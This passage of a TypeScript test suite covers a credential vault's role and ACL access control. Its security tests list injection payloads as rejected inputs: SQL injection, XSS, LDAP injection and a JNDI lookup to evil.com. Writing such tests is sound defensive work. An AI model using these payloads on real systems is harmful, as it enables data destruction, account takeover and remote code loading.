/**
 * Access Control System Tests
 *
 * Comprehensive test suite for RBAC and ACL functionality
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Database from 'better-sqlite3';
import { AccessControl, Permission, Role, type Identity } from './AccessControl.js';
import { CredentialVault } from './CredentialVault.js';
import { createTestDatabase } from './DatabaseFactory.js';
import fs from 'node:fs';

// Multi-user access control tests - SKIPPED (single-user vault only)
describe.skip('AccessControl', () => {
  let db: Database.Database;
  let accessControl: AccessControl;
  const testDbPath = ':memory:';

  const adminIdentity: Identity = {
    id: 'admin-user',
    type: 'user',
  };

  const regularUserIdentity: Identity = {
    id: 'regular-user',
    type: 'user',
  };

  const readOnlyIdentity: Identity = {
    id: 'readonly-user',
    type: 'user',
  };

  const auditorIdentity: Identity = {
    id: 'auditor-user',
    type: 'user',
  };

  beforeEach(() => {
    db = createTestDatabase(testDbPath);
    accessControl = new AccessControl(db);
  });

  afterEach(() => {
    if (db) {
      db.close();
    }
  });

  describe('Built-in Roles', () => {
    it('should create all built-in roles on initialization', () => {
      const roles = accessControl.listRoles();

      expect(roles).toHaveLength(4);
      expect(roles.map((r) => r.name)).toEqual(
        expect.arrayContaining([Role.ADMIN, Role.USER, Role.READ_ONLY, Role.AUDITOR])
      );
    });

    it('should have correct permissions for ADMIN role', () => {
      const adminRole = accessControl.getRole(Role.ADMIN);

      expect(adminRole).toBeDefined();
      expect(adminRole!.permissions).toEqual(
        expect.arrayContaining([
          Permission.READ,
          Permission.WRITE,
          Permission.DELETE,
          Permission.ADMIN,
          Permission.ROTATE,
          Permission.AUDIT,
        ])
      );
      expect(adminRole!.isBuiltIn).toBe(true);
    });

    it('should have correct permissions for USER role', () => {
      const userRole = accessControl.getRole(Role.USER);

      expect(userRole).toBeDefined();
      expect(userRole!.permissions).toEqual(
        expect.arrayContaining([Permission.READ, Permission.WRITE, Permission.ROTATE])
      );
      expect(userRole!.isBuiltIn).toBe(true);
    });

    it('should have correct permissions for READ_ONLY role', () => {
      const readOnlyRole = accessControl.getRole(Role.READ_ONLY);

      expect(readOnlyRole).toBeDefined();
      expect(readOnlyRole!.permissions).toEqual([Permission.READ]);
      expect(readOnlyRole!.isBuiltIn).toBe(true);
    });

    it('should have correct permissions for AUDITOR role', () => {
      const auditorRole = accessControl.getRole(Role.AUDITOR);

      expect(auditorRole).toBeDefined();
      expect(auditorRole!.permissions).toEqual(
        expect.arrayContaining([Permission.READ, Permission.AUDIT])
      );
      expect(auditorRole!.isBuiltIn).toBe(true);
    });

    it('should not allow deletion of built-in roles', () => {
      expect(() => accessControl.deleteRole(Role.ADMIN)).toThrow(
        'Cannot delete built-in role'
      );
    });
  });

  describe('Custom Roles', () => {
    it('should create a custom role', () => {
      const customRole = accessControl.createRole({
        name: 'custom-deployer',
        description: 'Can deploy to production',
        permissions: [Permission.READ, Permission.WRITE],
      });

      expect(customRole).toBeDefined();
      expect(customRole.name).toBe('custom-deployer');
      expect(customRole.permissions).toEqual([Permission.READ, Permission.WRITE]);
      expect(customRole.isBuiltIn).toBe(false);
      expect(customRole.id).toBeDefined();
    });

    it('should get a custom role by name', () => {
      accessControl.createRole({
        name: 'test-role',
        description: 'Test role',
        permissions: [Permission.READ],
      });

      const role = accessControl.getRole('test-role');

      expect(role).toBeDefined();
      expect(role!.name).toBe('test-role');
    });

    it('should list all roles including custom ones', () => {
      accessControl.createRole({
        name: 'custom-1',
        permissions: [Permission.READ],
      });

      accessControl.createRole({
        name: 'custom-2',
        permissions: [Permission.WRITE],
      });

      const roles = accessControl.listRoles();

      expect(roles.length).toBeGreaterThanOrEqual(6); // 4 built-in + 2 custom
      expect(roles.map((r) => r.name)).toEqual(
        expect.arrayContaining(['custom-1', 'custom-2'])
      );
    });

    it('should delete a custom role', () => {
      accessControl.createRole({
        name: 'to-delete',
        permissions: [Permission.READ],
      });

      expect(accessControl.getRole('to-delete')).toBeDefined();

      accessControl.deleteRole('to-delete');

      expect(accessControl.getRole('to-delete')).toBeNull();
    });

    it('should throw error when creating role without name', () => {
      expect(() =>
        accessControl.createRole({
          name: '',
          permissions: [Permission.READ],
        })
      ).toThrow('Role name is required');
    });

    it('should throw error when creating role without permissions', () => {
      expect(() =>
        accessControl.createRole({
          name: 'invalid-role',
          permissions: [],
        })
      ).toThrow('Role must have at least one permission');
    });

    it('should throw error when deleting non-existent role', () => {
      expect(() => accessControl.deleteRole('non-existent')).toThrow('Role not found');
    });
  });

  describe('Role Assignment', () => {
    it('should assign a role to an identity', () => {
      accessControl.assignRole(regularUserIdentity, Role.USER);

      const roles = accessControl.getRoles(regularUserIdentity);

      expect(roles).toHaveLength(1);
      expect(roles[0].name).toBe(Role.USER);
    });

    it('should assign multiple roles to an identity', () => {
      accessControl.assignRole(regularUserIdentity, Role.USER);
      accessControl.assignRole(regularUserIdentity, Role.AUDITOR);

      const roles = accessControl.getRoles(regularUserIdentity);

      expect(roles).toHaveLength(2);
      expect(roles.map((r) => r.name)).toEqual(
        expect.arrayContaining([Role.USER, Role.AUDITOR])
      );
    });

    it('should revoke a role from an identity', () => {
      accessControl.assignRole(regularUserIdentity, Role.USER);
      accessControl.assignRole(regularUserIdentity, Role.AUDITOR);

      accessControl.revokeRole(regularUserIdentity, Role.USER);

      const roles = accessControl.getRoles(regularUserIdentity);

      expect(roles).toHaveLength(1);
      expect(roles[0].name).toBe(Role.AUDITOR);
    });

    it('should support expiring role assignments', () => {
      const futureExpiry = new Date(Date.now() + 3600000); // 1 hour from now

      accessControl.assignRole(regularUserIdentity, Role.USER, {
        expiresAt: futureExpiry,
      });

      const roles = accessControl.getRoles(regularUserIdentity);

      expect(roles).toHaveLength(1);
      expect(roles[0].name).toBe(Role.USER);
    });

    it('should not return expired role assignments', () => {
      const pastExpiry = new Date(Date.now() - 3600000); // 1 hour ago

      accessControl.assignRole(regularUserIdentity, Role.USER, {
        expiresAt: pastExpiry,
      });

      const roles = accessControl.getRoles(regularUserIdentity);

      expect(roles).toHaveLength(0);
    });

    it('should track who granted the role', () => {
      accessControl.assignRole(regularUserIdentity, Role.USER, {
        grantedBy: 'admin-user',
      });

      const roles = accessControl.getRoles(regularUserIdentity);

      expect(roles).toHaveLength(1);
      // Note: grantedBy is not exposed in RoleConfig, but it's stored in the database
    });

    it('should throw error when assigning non-existent role', () => {
      expect(() =>
        accessControl.assignRole(regularUserIdentity, 'non-existent-role' as Role)
      ).toThrow('Role not found');
    });

    it('should throw error when revoking non-existent assignment', () => {
      expect(() => accessControl.revokeRole(regularUserIdentity, Role.USER)).toThrow(
        'Role assignment not found'
      );
    });
  });

  describe('Permission Checks', () => {
    beforeEach(() => {
      // Set up identities with different roles
      accessControl.assignRole(adminIdentity, Role.ADMIN);
      accessControl.assignRole(regularUserIdentity, Role.USER);
      accessControl.assignRole(readOnlyIdentity, Role.READ_ONLY);
      accessControl.assignRole(auditorIdentity, Role.AUDITOR);
    });

    it('should allow ADMIN to perform any operation', () => {
      const readCheck = accessControl.checkPermission(
        Permission.READ,
        'test-service',
        'test-account',
        adminIdentity
      );
      expect(readCheck.allowed).toBe(true);

      const writeCheck = accessControl.checkPermission(
        Permission.WRITE,
        'test-service',
        'test-account',
        adminIdentity
      );
      expect(writeCheck.allowed).toBe(true);

      const deleteCheck = accessControl.checkPermission(
        Permission.DELETE,
        'test-service',
        'test-account',
        adminIdentity
      );
      expect(deleteCheck.allowed).toBe(true);

      const rotateCheck = accessControl.checkPermission(
        Permission.ROTATE,
        'test-service',
        'test-account',
        adminIdentity
      );
      expect(rotateCheck.allowed).toBe(true);

      const auditCheck = accessControl.checkPermission(
        Permission.AUDIT,
        'test-service',
        'test-account',
        adminIdentity
      );
      expect(auditCheck.allowed).toBe(true);
    });

    it('should allow USER to read, write, and rotate', () => {
      const readCheck = accessControl.checkPermission(
        Permission.READ,
        'test-service',
        'test-account',
        regularUserIdentity
      );
      expect(readCheck.allowed).toBe(true);

      const writeCheck = accessControl.checkPermission(
        Permission.WRITE,
        'test-service',
        'test-account',
        regularUserIdentity
      );
      expect(writeCheck.allowed).toBe(true);

      const rotateCheck = accessControl.checkPermission(
        Permission.ROTATE,
        'test-service',
        'test-account',
        regularUserIdentity
      );
      expect(rotateCheck.allowed).toBe(true);
    });

    it('should deny USER from deleting', () => {
      const deleteCheck = accessControl.checkPermission(
        Permission.DELETE,
        'test-service',
        'test-account',
        regularUserIdentity
      );

      expect(deleteCheck.allowed).toBe(false);
      expect(deleteCheck.reason).toContain('Permission denied');
    });

    it('should allow READ_ONLY to only read', () => {
      const readCheck = accessControl.checkPermission(
        Permission.READ,
        'test-service',
        'test-account',
        readOnlyIdentity
      );
      expect(readCheck.allowed).toBe(true);

      const writeCheck = accessControl.checkPermission(
        Permission.WRITE,
        'test-service',
        'test-account',
        readOnlyIdentity
      );
      expect(writeCheck.allowed).toBe(false);
    });

    it('should allow AUDITOR to read and audit', () => {
      const readCheck = accessControl.checkPermission(
        Permission.READ,
        'test-service',
        'test-account',
        auditorIdentity
      );
      expect(readCheck.allowed).toBe(true);

      const auditCheck = accessControl.checkPermission(
        Permission.AUDIT,
        'test-service',
        'test-account',
        auditorIdentity
      );
      expect(auditCheck.allowed).toBe(true);

      const writeCheck = accessControl.checkPermission(
        Permission.WRITE,
        'test-service',
        'test-account',
        auditorIdentity
      );
      expect(writeCheck.allowed).toBe(false);
    });

    it('should deny access when no identity is provided', () => {
      const check = accessControl.checkPermission(
        Permission.READ,
        'test-service',
        'test-account'
      );

      expect(check.allowed).toBe(false);
      expect(check.reason).toBe('No identity specified');
    });

    it('should return effective permissions in check result', () => {
      const check = accessControl.checkPermission(
        Permission.READ,
        'test-service',
        'test-account',
        regularUserIdentity
      );

      expect(check.effectivePermissions).toEqual(
        expect.arrayContaining([Permission.READ, Permission.WRITE, Permission.ROTATE])
      );
    });
  });

  describe('ACL Entries', () => {
    it('should grant specific permissions to an identity', () => {
      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'production-db',
        account: 'admin',
        permissions: [Permission.DELETE],
      });

      const check = accessControl.checkPermission(
        Permission.DELETE,
        'production-db',
        'admin',
        regularUserIdentity
      );

      expect(check.allowed).toBe(true);
    });

    it('should support service patterns', () => {
      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        servicePattern: 'production-*',
        permissions: [Permission.DELETE],
      });

      const check1 = accessControl.checkPermission(
        Permission.DELETE,
        'production-db',
        'user',
        regularUserIdentity
      );
      expect(check1.allowed).toBe(true);

      const check2 = accessControl.checkPermission(
        Permission.DELETE,
        'production-api',
        'user',
        regularUserIdentity
      );
      expect(check2.allowed).toBe(true);

      const check3 = accessControl.checkPermission(
        Permission.DELETE,
        'staging-db',
        'user',
        regularUserIdentity
      );
      expect(check3.allowed).toBe(false);
    });

    it('should revoke specific permissions', () => {
      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'test-service',
        account: 'test-account',
        permissions: [Permission.DELETE],
      });

      accessControl.revokePermissions(regularUserIdentity, 'test-service', 'test-account');

      const check = accessControl.checkPermission(
        Permission.DELETE,
        'test-service',
        'test-account',
        regularUserIdentity
      );

      expect(check.allowed).toBe(false);
    });

    it('should revoke all permissions for a service', () => {
      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'test-service',
        account: 'account1',
        permissions: [Permission.DELETE],
      });

      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'test-service',
        account: 'account2',
        permissions: [Permission.DELETE],
      });

      accessControl.revokePermissions(regularUserIdentity, 'test-service');

      const check1 = accessControl.checkPermission(
        Permission.DELETE,
        'test-service',
        'account1',
        regularUserIdentity
      );
      expect(check1.allowed).toBe(false);

      const check2 = accessControl.checkPermission(
        Permission.DELETE,
        'test-service',
        'account2',
        regularUserIdentity
      );
      expect(check2.allowed).toBe(false);
    });

    it('should list all ACL entries for an identity', () => {
      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'service1',
        permissions: [Permission.DELETE],
      });

      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'service2',
        permissions: [Permission.WRITE],
      });

      const entries = accessControl.listAccessEntries(regularUserIdentity);

      expect(entries).toHaveLength(2);
      expect(entries.map((e) => e.service)).toEqual(
        expect.arrayContaining(['service1', 'service2'])
      );
    });

    it('should support expiring ACL entries', () => {
      const futureExpiry = new Date(Date.now() + 3600000); // 1 hour from now

      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'temp-service',
        permissions: [Permission.WRITE],
        expiresAt: futureExpiry,
      });

      const check = accessControl.checkPermission(
        Permission.WRITE,
        'temp-service',
        undefined,
        regularUserIdentity
      );

      expect(check.allowed).toBe(true);
    });

    it('should not grant expired ACL entries', () => {
      const pastExpiry = new Date(Date.now() - 3600000); // 1 hour ago

      accessControl.grantPermissions({
        identityId: regularUserIdentity.id,
        identityType: regularUserIdentity.type,
        service: 'expired-service',
        permissions: [Permission.WRITE],
        expiresAt: pastExpiry,
      });

      const check = accessControl.checkPermission(
        Permission.WRITE,
        'expired-service',
        undefined,
        regularUserIdentity
      );

      expect(check.allowed).toBe(false);
    });

    it('should throw error when granting permissions without service or pattern', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: regularUserIdentity.id,
          identityType: regularUserIdentity.type,
          permissions: [Permission.WRITE],
        })
      ).toThrow('Must specify either servicePattern or service');
    });

    it('should throw error when granting no permissions', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: regularUserIdentity.id,
          identityType: regularUserIdentity.type,
          service: 'test-service',
          permissions: [],
        })
      ).toThrow('Must specify at least one permission');
    });
  });

  describe('Current Identity', () => {
    it('should set and get current identity', () => {
      accessControl.setIdentity(regularUserIdentity);

      const currentIdentity = accessControl.getIdentity();

      expect(currentIdentity).toEqual(regularUserIdentity);
    });

    it('should use current identity for permission checks when not specified', () => {
      accessControl.assignRole(regularUserIdentity, Role.USER);
      accessControl.setIdentity(regularUserIdentity);

      const check = accessControl.checkPermission(Permission.READ, 'test-service');

      expect(check.allowed).toBe(true);
    });

    it('should check admin status', () => {
      accessControl.assignRole(adminIdentity, Role.ADMIN);

      expect(accessControl.isAdmin(adminIdentity)).toBe(true);
      expect(accessControl.isAdmin(regularUserIdentity)).toBe(false);
    });

    it('should check admin status for current identity', () => {
      accessControl.assignRole(adminIdentity, Role.ADMIN);
      accessControl.setIdentity(adminIdentity);

      expect(accessControl.isAdmin()).toBe(true);
    });
  });

  describe('Permission Inheritance', () => {
    it('should grant all permissions when ADMIN permission is present', () => {
      // ADMIN permission must be granted via role, not ACL entry
      accessControl.assignRole(regularUserIdentity, Role.ADMIN);

      const readCheck = accessControl.checkPermission(
        Permission.READ,
        'special-service',
        undefined,
        regularUserIdentity
      );
      expect(readCheck.allowed).toBe(true);

      const writeCheck = accessControl.checkPermission(
        Permission.WRITE,
        'special-service',
        undefined,
        regularUserIdentity
      );
      expect(writeCheck.allowed).toBe(true);

      const deleteCheck = accessControl.checkPermission(
        Permission.DELETE,
        'special-service',
        undefined,
        regularUserIdentity
      );
      expect(deleteCheck.allowed).toBe(true);

      const rotateCheck = accessControl.checkPermission(
        Permission.ROTATE,
        'special-service',
        undefined,
        regularUserIdentity
      );
      expect(rotateCheck.allowed).toBe(true);

      const auditCheck = accessControl.checkPermission(
        Permission.AUDIT,
        'special-service',
        undefined,
        regularUserIdentity
      );
      expect(auditCheck.allowed).toBe(true);
    });

    it('should combine permissions from multiple roles', () => {
      accessControl.assignRole(regularUserIdentity, Role.USER); // READ, WRITE, ROTATE
      accessControl.assignRole(regularUserIdentity, Role.AUDITOR); // READ, AUDIT

      const check = accessControl.checkPermission(
        Permission.AUDIT,
        'test-service',
        undefined,
        regularUserIdentity
      );

      expect(check.allowed).toBe(true);
      expect(check.effectivePermissions).toEqual(
        expect.arrayContaining([
          Permission.READ,
          Permission.WRITE,
          Permission.ROTATE,
          Permission.AUDIT,
        ])
      );
    });

    it('should combine permissions from roles and ACL entries', () => {
      accessControl.assignRole(readOnlyIdentity, Role.READ_ONLY); // READ only

      accessControl.grantPermissions({
        identityId: readOnlyIdentity.id,
        identityType: readOnlyIdentity.type,
        service: 'special-service',
        permissions: [Permission.WRITE],
      });

      const writeCheck = accessControl.checkPermission(
        Permission.WRITE,
        'special-service',
        undefined,
        readOnlyIdentity
      );

      expect(writeCheck.allowed).toBe(true);
    });
  });
});

// Multi-user vault integration tests - SKIPPED (single-user vault only)
describe.skip('CredentialVault with Access Control', () => {
  let vault: CredentialVault;
  let vaultWithAdmin: CredentialVault;
  let vaultWithUser: CredentialVault;
  let vaultWithReadOnly: CredentialVault;
  let testDbPath: string;

  const adminIdentity: Identity = {
    id: 'admin-user',
    type: 'user',
  };

  const userIdentity: Identity = {
    id: 'regular-user',
    type: 'user',
  };

  const readOnlyIdentity: Identity = {
    id: 'readonly-user',
    type: 'user',
  };

  beforeEach(async () => {
    // Use a unique temporary file for each test to avoid conflicts
    testDbPath = `/tmp/test-vault-${Date.now()}-${Math.random()}.db`;

    // Create vault with admin identity
    vaultWithAdmin = CredentialVault.create(testDbPath, adminIdentity);
    vaultWithAdmin.assignRole(adminIdentity, Role.ADMIN);

    // Create vault with user identity (same database)
    vaultWithUser = CredentialVault.create(testDbPath, userIdentity);
    vaultWithUser.assignRole(userIdentity, Role.USER);

    // Create vault with read-only identity (same database)
    vaultWithReadOnly = CredentialVault.create(testDbPath, readOnlyIdentity);
    vaultWithReadOnly.assignRole(readOnlyIdentity, Role.READ_ONLY);
  });

  afterEach(async () => {
    if (vaultWithAdmin) {
      await vaultWithAdmin.close();
    }
    if (vaultWithUser) {
      await vaultWithUser.close();
    }
    if (vaultWithReadOnly) {
      await vaultWithReadOnly.close();
    }
    if (vault) {
      await vault.close();
    }

    // Clean up temporary database file
    try {
      if (testDbPath && testDbPath !== ':memory:' && fs.existsSync(testDbPath)) {
        fs.unlinkSync(testDbPath);
      }
      // Also clean up WAL files
      if (testDbPath && fs.existsSync(`${testDbPath}-wal`)) {
        fs.unlinkSync(`${testDbPath}-wal`);
      }
      if (testDbPath && fs.existsSync(`${testDbPath}-shm`)) {
        fs.unlinkSync(`${testDbPath}-shm`);
      }
    } catch (error) {
      // Ignore cleanup errors
    }
  });

  describe('Add Operation', () => {
    it('should allow admin to add credentials', async () => {
      await expect(
        vaultWithAdmin.add({
          service: 'test-service',
          account: 'test-account',
          credential: { password: 'test-password' },
        })
      ).resolves.toBeDefined();
    });

    it('should allow user to add credentials', async () => {
      await expect(
        vaultWithUser.add({
          service: 'test-service',
          account: 'test-account',
          credential: { password: 'test-password' },
        })
      ).resolves.toBeDefined();
    });

    it('should deny read-only user from adding credentials', async () => {
      await expect(
        vaultWithReadOnly.add({
          service: 'test-service',
          account: 'test-account',
          credential: { password: 'test-password' },
        })
      ).rejects.toThrow('Permission denied');
    });

    it('should log permission denial to audit trail', async () => {
      try {
        await vaultWithReadOnly.add({
          service: 'test-service',
          account: 'test-account',
          credential: { password: 'test-password' },
        });
      } catch {
        // Expected to throw
      }

      const stats = vaultWithReadOnly.getAuditStats();
      expect(stats.failedEvents).toBeGreaterThan(0);
    });
  });

  describe('Get Operation', () => {
    beforeEach(async () => {
      // Add a credential as admin
      await vaultWithAdmin.add({
        service: 'test-service',
        account: 'test-account',
        credential: { password: 'test-password' },
      });
    });

    it('should allow admin to get credentials', async () => {
      const cred = await vaultWithAdmin.get('test-service', 'test-account');

      expect(cred).toBeDefined();
      expect(cred!.service).toBe('test-service');
    });

    it('should allow user to get credentials', async () => {
      const cred = await vaultWithUser.get('test-service', 'test-account');

      expect(cred).toBeDefined();
      expect(cred!.service).toBe('test-service');
    });

    it('should allow read-only user to get credentials', async () => {
      const cred = await vaultWithReadOnly.get('test-service', 'test-account');

      expect(cred).toBeDefined();
      expect(cred!.service).toBe('test-service');
    });
  });

  describe('Delete Operation', () => {
    beforeEach(async () => {
      // Add a credential as admin
      await vaultWithAdmin.add({
        service: 'test-service',
        account: 'test-account',
        credential: { password: 'test-password' },
      });
    });

    it('should allow admin to delete credentials', async () => {
      await expect(
        vaultWithAdmin.delete('test-service', 'test-account')
      ).resolves.toBeUndefined();

      const cred = await vaultWithAdmin.get('test-service', 'test-account');
      expect(cred).toBeNull();
    });

    it('should deny user from deleting credentials', async () => {
      await expect(vaultWithUser.delete('test-service', 'test-account')).rejects.toThrow(
        'Permission denied'
      );
    });

    it('should deny read-only user from deleting credentials', async () => {
      await expect(
        vaultWithReadOnly.delete('test-service', 'test-account')
      ).rejects.toThrow('Permission denied');
    });
  });

  describe('Access Control API Integration', () => {
    it('should expose identity management', () => {
      vaultWithAdmin.setIdentity(adminIdentity);

      const identity = vaultWithAdmin.getIdentity();

      expect(identity).toEqual(adminIdentity);
    });

    it('should expose role management', () => {
      const customRole = vaultWithAdmin.createRole({
        name: 'deployer',
        permissions: [Permission.READ, Permission.WRITE],
      });

      expect(customRole.name).toBe('deployer');

      const role = vaultWithAdmin.getRole('deployer');
      expect(role).toBeDefined();
    });

    it('should expose permission checking', () => {
      const check = vaultWithAdmin.checkPermission(
        Permission.WRITE,
        'test-service',
        'test-account',
        userIdentity
      );

      expect(check).toBeDefined();
      expect(check.allowed).toBeDefined();
    });

    it('should expose ACL management', () => {
      vaultWithAdmin.grantPermissions({
        identityId: userIdentity.id,
        identityType: userIdentity.type,
        service: 'special-service',
        permissions: [Permission.DELETE],
      });

      const entries = vaultWithAdmin.listAccessEntries(userIdentity);

      expect(entries.length).toBeGreaterThan(0);
    });
  });

  describe('Backward Compatibility', () => {
    it('should work without identity (legacy mode)', () => {
      vault = CredentialVault.create(testDbPath);

      expect(vault).toBeDefined();
      expect(vault.getIdentity()).toBeUndefined();
    });

    it('should deny operations when no identity is set', async () => {
      vault = CredentialVault.create(testDbPath);

      await expect(
        vault.add({
          service: 'test-service',
          account: 'test-account',
          credential: { password: 'test-password' },
        })
      ).rejects.toThrow('No identity specified');
    });
  });
});

/**
 * Security Test Suite for Access Control
 *
 * Tests security vulnerabilities fixed in the code review:
 * - CRITICAL-1: SQL injection via GLOB patterns
 * - CRITICAL-2: Missing ADMIN permission checks
 * - HIGH-4: Identity validation
 * - MEDIUM-4: ADMIN permission restriction
 */
// Multi-user security tests - SKIPPED (single-user vault only)
describe.skip('Security Tests - Access Control Attack Vectors', () => {
  let db: Database.Database;
  let accessControl: AccessControl;
  let testDbPath: string;

  const adminIdentity: Identity = {
    id: 'security-admin',
    type: 'user',
  };

  const attackerIdentity: Identity = {
    id: 'attacker',
    type: 'user',
  };

  beforeEach(() => {
    testDbPath = `/tmp/security-ac-test-${Date.now()}-${Math.random()}.db`;
    db = createTestDatabase(testDbPath);
    accessControl = new AccessControl(db);

    // Bootstrap admin user
    accessControl.assignRole(adminIdentity, Role.ADMIN);
    accessControl.setIdentity(adminIdentity);
  });

  afterEach(() => {
    if (db) {
      db.close();
    }
    if (testDbPath && testDbPath !== ':memory:' && fs.existsSync(testDbPath)) {
      fs.unlinkSync(testDbPath);
    }
    if (testDbPath && fs.existsSync(`${testDbPath}-wal`)) {
      fs.unlinkSync(`${testDbPath}-wal`);
    }
    if (testDbPath && fs.existsSync(`${testDbPath}-shm`)) {
      fs.unlinkSync(`${testDbPath}-shm`);
    }
  });

  describe('[CRITICAL-1] GLOB Pattern Injection Attacks', () => {
    it('should block wildcard-only pattern (*)', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: attackerIdentity.id,
          identityType: attackerIdentity.type,
          servicePattern: '*',
          permissions: [Permission.READ],
        })
      ).toThrow('Overly broad service pattern');
    });

    it('should block double wildcard pattern (**)', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: attackerIdentity.id,
          identityType: attackerIdentity.type,
          servicePattern: '**',
          permissions: [Permission.READ],
        })
      ).toThrow('Overly broad service pattern');
    });

    it('should block wildcard prefix attacks (*.service)', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: attackerIdentity.id,
          identityType: attackerIdentity.type,
          servicePattern: '*.critical-service',
          permissions: [Permission.READ],
        })
      ).toThrow('Service pattern must start with a specific prefix');
    });

    it('should block SQL injection in patterns', () => {
      const sqlInjections = [
        "'; DROP TABLE ac_entries; --",
        "' OR '1'='1",
        "'; UPDATE ac_entries SET permissions='[\"ADMIN\"]'; --",
      ];

      sqlInjections.forEach((injection) => {
        expect(() =>
          accessControl.grantPermissions({
            identityId: attackerIdentity.id,
            identityType: attackerIdentity.type,
            servicePattern: injection,
            permissions: [Permission.READ],
          })
        ).toThrow('Invalid characters in service pattern');
      });
    });

    it('should allow safe GLOB patterns', () => {
      const safePatterns = ['api.*', 'service-v1.*', 'internal.api.*'];

      safePatterns.forEach((pattern) => {
        expect(() =>
          accessControl.grantPermissions({
            identityId: attackerIdentity.id,
            identityType: attackerIdentity.type,
            servicePattern: pattern,
            permissions: [Permission.READ],
          })
        ).not.toThrow();
      });
    });
  });

  describe('[CRITICAL-2] Privilege Escalation via Missing Admin Checks', () => {
    beforeEach(() => {
      // Switch to attacker with USER role
      accessControl.assignRole(attackerIdentity, Role.USER);
      accessControl.setIdentity(attackerIdentity);
    });

    it('should block non-admin from creating custom roles', () => {
      expect(() =>
        accessControl.createRole({
          name: 'privilege-escalation',
          permissions: [Permission.DELETE],
        })
      ).toThrow('Admin permission required');
    });

    it('should block non-admin from deleting roles', () => {
      // Admin creates a role first
      accessControl.setIdentity(adminIdentity);
      accessControl.createRole({
        name: 'temp-role',
        permissions: [Permission.READ],
      });

      // Attacker tries to delete it
      accessControl.setIdentity(attackerIdentity);
      expect(() => accessControl.deleteRole('temp-role')).toThrow('Admin permission required');
    });

    it('should block non-admin from assigning admin role to self', () => {
      expect(() => accessControl.assignRole(attackerIdentity, Role.ADMIN)).toThrow(
        'Admin permission required'
      );
    });

    it('should block non-admin from assigning roles to others', () => {
      const victimIdentity: Identity = { id: 'victim', type: 'user' };

      expect(() => accessControl.assignRole(victimIdentity, Role.ADMIN)).toThrow(
        'Admin permission required'
      );
    });

    it('should block non-admin from granting permissions', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: attackerIdentity.id,
          identityType: attackerIdentity.type,
          service: 'admin-service',
          permissions: [Permission.DELETE],
        })
      ).toThrow('Admin permission required');
    });

    it('should block non-admin from revoking permissions', () => {
      // Admin grants permission
      accessControl.setIdentity(adminIdentity);
      accessControl.grantPermissions({
        identityId: attackerIdentity.id,
        identityType: attackerIdentity.type,
        service: 'test-service',
        permissions: [Permission.READ],
      });

      // Attacker tries to revoke
      accessControl.setIdentity(attackerIdentity);
      expect(() => accessControl.revokePermissions(attackerIdentity, 'test-service')).toThrow(
        'Admin permission required'
      );
    });
  });

  describe('[HIGH-4] Identity Injection Attacks', () => {
    it('should block SQL injection in identity id', () => {
      const sqlInjections = [
        { id: "admin' OR '1'='1", type: 'user' },
        { id: "'; DROP TABLE ac_role_assignments; --", type: 'user' },
        { id: "' UNION SELECT * FROM ac_entries WHERE '1'='1", type: 'user' },
      ];

      sqlInjections.forEach((identity) => {
        expect(() => accessControl.setIdentity(identity as Identity)).toThrow(
          'Invalid identity id format'
        );
      });
    });

    it('should block XSS attempts in identity fields', () => {
      const xssAttempts = [
        { id: '<script>alert("xss")</script>', type: 'user' },
        { id: 'user<img src=x onerror=alert(1)>', type: 'user' },
        { id: 'user<svg/onload=alert(1)>', type: 'user' },
      ];

      xssAttempts.forEach((identity) => {
        expect(() => accessControl.setIdentity(identity as Identity)).toThrow();
      });
    });

    it('should block LDAP injection attempts', () => {
      const ldapInjections = [
        { id: 'user)(uid=*', type: 'user' },
        { id: 'admin)(&(password=*)', type: 'user' },
        { id: '${jndi:ldap://evil.com/a}', type: 'user' },
      ];

      ldapInjections.forEach((identity) => {
        expect(() => accessControl.setIdentity(identity as Identity)).toThrow();
      });
    });

    it('should block empty identity fields', () => {
      expect(() => accessControl.setIdentity({ id: '', type: 'user' } as Identity)).toThrow(
        'Identity id is required'
      );

      expect(() => accessControl.setIdentity({ id: 'user', type: '' } as Identity)).toThrow(
        'Identity type is required'
      );
    });

    it('should block invalid identity types', () => {
      const invalidTypes = ['admin', 'root', 'superuser', 'hacker', 'attacker'];

      invalidTypes.forEach((type) => {
        expect(() => accessControl.setIdentity({ id: 'user', type } as Identity)).toThrow(
          'Invalid identity type'
        );
      });
    });

    it('should block excessively long identity id (DoS prevention)', () => {
      const longId = 'a'.repeat(256); // Over 255 limit

      expect(() => accessControl.setIdentity({ id: longId, type: 'user' })).toThrow(
        'Identity id is too long'
      );
    });

    it('should accept legitimate identity formats', () => {
      const validIdentities = [
        { id: 'user-123', type: 'user' },
        { id: 'user.name', type: 'user' },
        { id: 'user_name', type: 'user' },
        { id: 'user@domain.com', type: 'user' },
        { id: 'service-api-v2', type: 'service' },
      ];

      validIdentities.forEach((identity) => {
        expect(() => accessControl.setIdentity(identity as Identity)).not.toThrow();
      });
    });
  });

  describe('[MEDIUM-4] ADMIN Permission Restriction', () => {
    it('should block ADMIN in custom roles', () => {
      expect(() =>
        accessControl.createRole({
          name: 'super-admin',
          permissions: [Permission.ADMIN, Permission.READ],
        })
      ).toThrow('ADMIN permission is restricted to built-in roles only');
    });

    it('should block ADMIN via ACL entries', () => {
      expect(() =>
        accessControl.grantPermissions({
          identityId: attackerIdentity.id,
          identityType: attackerIdentity.type,
          service: 'admin-service',
          permissions: [Permission.ADMIN],
        })
      ).toThrow('ADMIN permission cannot be granted via ACL entries');
    });

    it('should only allow ADMIN via built-in admin role', () => {
